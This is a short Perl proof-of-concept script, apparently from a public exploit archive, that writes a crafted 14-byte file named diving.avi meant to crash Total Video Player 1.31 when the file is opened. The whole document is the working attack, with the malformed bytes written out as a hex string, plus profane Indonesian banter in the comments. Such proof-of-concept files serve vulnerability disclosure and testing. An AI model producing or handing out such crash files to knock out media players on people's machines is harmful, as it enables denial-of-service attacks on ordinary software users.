#!perl

#############################################
# Total Video Player 1.31 (.avi) Local Crash PoC
# by: diving
# Thanks: Indonesian 31337 server diving aka loncat indah :)
# Note: Kalau hanya bisa loncat indah, loncat indah aja. engga usah main kayak ginian
#       main balon sana dodol.
#############################################


my $diving = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
#############################################
open(fuck, "> diving.avi");
print (fuck $diving);
#############################################